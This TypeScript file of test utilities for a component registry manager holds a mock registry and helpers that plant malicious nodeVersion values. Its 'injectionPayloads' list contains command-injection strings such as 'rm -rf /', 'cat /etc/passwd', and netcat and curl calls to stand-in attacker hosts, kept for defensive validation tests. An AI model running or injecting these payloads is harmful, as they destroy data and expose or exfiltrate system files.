/**
 * Shared test utilities for ComponentRegistryManager tests
 *
 * NOTE: Mock declarations must be in each test file (Jest hoisting requirement).
 * This file contains only shared test data and helper functions.
 */

import type { RawComponentRegistry } from '@/types';

/**
 * Sample raw registry data for testing
 */
export const mockRawRegistry: RawComponentRegistry = {
    version: '2.0',
    selectionGroups: {
        frontends: ['frontend1', 'frontend2'],
        backends: ['backend1'],
        dependencies: ['dep1'],
        integrations: ['integration1'],
        appBuilderApps: ['app1'],
    },
    components: {
        frontend1: {
            id: 'frontend1',
            name: 'Frontend 1',
            description: 'Test Frontend',
            type: 'frontend',
            compatibleBackends: ['backend1'],
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
                port: 3000,
                requiredEnvVars: ['VAR1', 'VAR2'],
                optionalEnvVars: [],
            },
            dependencies: {
                required: ['dep1'],
                optional: [],
            },
        },
        frontend2: {
            id: 'frontend2',
            name: 'Frontend 2',
            description: 'Second Frontend',
            type: 'frontend',
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend2',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        backend1: {
            id: 'backend1',
            name: 'Backend 1',
            description: 'Test Backend',
            type: 'backend',
            source: {
                type: 'git',
                url: 'https://github.com/test/backend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
        dep1: {
            id: 'dep1',
            name: 'Dependency 1',
            description: 'Test Dependency',
            type: 'dependency',
            source: {
                type: 'git',
                url: 'https://github.com/test/dep1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        integration1: {
            id: 'integration1',
            name: 'Integration 1',
            description: 'Test Integration',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/integration1',
                version: '1.0.0',
            },
        },
        app1: {
            id: 'app1',
            name: 'App Builder App',
            description: 'Test App',
            type: 'app-builder',
            source: {
                type: 'git',
                url: 'https://github.com/test/app1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '22',
            },
        },
    },
    infrastructure: {
        infra1: {
            id: 'infra1',
            name: 'Infrastructure 1',
            description: 'Test Infrastructure',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/infra1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    services: {
        service1: {
            id: 'service1',
            name: 'Service 1',
            description: 'Test Service',
            requiredEnvVars: ['SERVICE_VAR1'],
        },
    },
    envVars: {
        VAR1: {
            type: 'text',
            label: 'Variable 1',
            description: 'Variable 1',
            required: true,
        },
        VAR2: {
            type: 'text',
            label: 'Variable 2',
            description: 'Variable 2',
            required: false,
        },
        SERVICE_VAR1: {
            type: 'text',
            label: 'Service Variable 1',
            description: 'Service Variable 1',
            required: true,
        },
    },
};

/**
 * Known injection payloads for security testing
 */
export const injectionPayloads = [
    '20; rm -rf /',
    '20 && cat /etc/passwd',
    '20 | nc attacker.com 1234',
    '20`whoami`',
    '20$(id)',
    "20' OR '1'='1",
    '20\nrm -rf /',
    '20;$(curl evil.com)',
    '20 & curl http://evil.com',
];

/**
 * Get the mock ConfigurationLoader instance
 * Note: Gets the LAST instance created (most recent)
 */
export function getMockLoader(): any {
    const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
    const instances = ConfigurationLoader.mock.results;
    return instances[instances.length - 1]?.value;
}

/**
 * Create a modified registry with malicious nodeVersion in specific component
 */
export function createMaliciousRegistry(
    componentPath: string,
    maliciousVersion: string
): RawComponentRegistry {
    const [section, componentId] = componentPath.split('.');

    if (section === 'infrastructure') {
        return {
            ...mockRawRegistry,
            infrastructure: {
                [componentId]: {
                    ...mockRawRegistry.infrastructure![componentId],
                    configuration: {
                        ...mockRawRegistry.infrastructure![componentId].configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    } else {
        return {
            ...mockRawRegistry,
            components: {
                ...mockRawRegistry.components!,
                [componentId]: {
                    ...mockRawRegistry.components![componentId],
                    configuration: {
                        ...mockRawRegistry.components![componentId].configuration,
                        nodeVersion: maliciousVersion,
                    },
                },
            },
        };
    }
}
